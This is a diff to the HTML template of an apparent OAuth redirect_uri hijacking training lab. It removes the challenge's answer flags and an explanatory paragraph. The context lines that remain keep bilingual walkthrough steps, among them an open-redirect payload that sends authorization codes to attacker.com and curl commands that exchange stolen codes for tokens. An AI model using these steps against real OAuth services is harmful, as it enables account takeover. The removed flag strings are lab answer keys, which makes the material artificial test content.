@@ -45,12 +45,10 @@
 
   <div class="hl-card mb-4">
     <h2 class="font-semibold text-sm mb-3" data-i18n="oauth_how">How OAuth redirect_uri Attack Works</h2>
-    <p class="text-xs text-gray-400 leading-relaxed mb-2" data-i18n="oauth_how_desc">
-      In OAuth 2.0, after the user authorizes the application the server redirects to <code class="font-mono text-xs">redirect_uri</code> with the authorization code. If the server does not validate this URI, an attacker can set it to any URL they control and steal the code.
-    </p>
+    <p class="text-xs text-gray-400 leading-relaxed mb-2" data-i18n="oauth_how_desc"></p>
     <ol class="text-xs text-gray-400 space-y-1 list-decimal list-inside">
       <li data-i18n="oauth_step1">User clicks "Authorize" in the legitimate app</li>
-      <li data-i18n="oauth_step2">Attacker intercepts the request and changes <code class="font-mono">redirect_uri</code></li>
+      <li data-i18n="oauth_step2">Attacker intercepts the request and replaces redirect_uri</li>
       <li data-i18n="oauth_step3">Authorization code is sent to the attacker's server</li>
       <li data-i18n="oauth_step4">Attacker exchanges the code for an access token</li>
       <li data-i18n="oauth_step5">Attacker accesses the victim's resources</li>
@@ -73,7 +71,6 @@
       <li>Accede al recurso protegido con el token:
         <pre>curl {{ target_base }}/oauth/userinfo -H "Authorization: Bearer TOKEN"</pre>
       </li>
-      <li>Flag dedicada: <code>HL{04u7h_r3d1r3c7_0wn3d}</code></li>
     </ol>
 
     <h3>Medium — Dominio validado, bypass por path</h3>
@@ -86,7 +83,6 @@
         <pre>redirect_uri={{ target_base }}/open_redirect?url=http://attacker.com</pre>
       </li>
       <li>El código llega al path controlado. Extráelo de los logs/headers y procede como en Easy.</li>
-      <li>Flag dedicada: <code>HL{04u7h_r3d1r3c7_0wn3d}</code></li>
     </ol>
 
     <h3>Hard — Whitelist exacta, bypass de state</h3>
@@ -107,7 +103,6 @@ curl "{{ target_base }}/open_redirect?url=http://attacker.com"
         <pre>curl -X POST {{ target_base }}/oauth/token \
       -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri={{ target_base }}/oauth/callback"</pre>
       </li>
-      <li>Flag dedicada: <code>HL{04u7h_r3d1r3c7_0wn3d}</code></li>
     </ol>
 
     <h3>Herramientas</h3>
@@ -127,7 +122,6 @@ curl "{{ target_base }}/open_redirect?url=http://attacker.com"
       <li>Access the protected resource with the token:
         <pre>curl {{ target_base }}/oauth/userinfo -H "Authorization: Bearer TOKEN"</pre>
       </li>
-      <li>Dedicated flag: <code>HL{04u7h_r3d1r3c7_0wn3d}</code></li>
     </ol>
 
     <h3>Medium — Domain validated, path bypass</h3>
@@ -140,7 +134,6 @@ curl "{{ target_base }}/open_redirect?url=http://attacker.com"
         <pre>redirect_uri={{ target_base }}/open_redirect?url=http://attacker.com</pre>
       </li>
       <li>The code arrives at the controlled path. Extract it from logs/headers and proceed as in Easy.</li>
-      <li>Dedicated flag: <code>HL{04u7h_r3d1r3c7_0wn3d}</code></li>
     </ol>
 
     <h3>Hard — Exact whitelist, state bypass</h3>
@@ -161,7 +154,6 @@ curl "{{ target_base }}/open_redirect?url=http://attacker.com"
         <pre>curl -X POST {{ target_base }}/oauth/token \
       -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri={{ target_base }}/oauth/callback"</pre>
       </li>
-      <li>Dedicated flag: <code>HL{04u7h_r3d1r3c7_0wn3d}</code></li>
     </ol>
 
     <h3>Tools</h3>
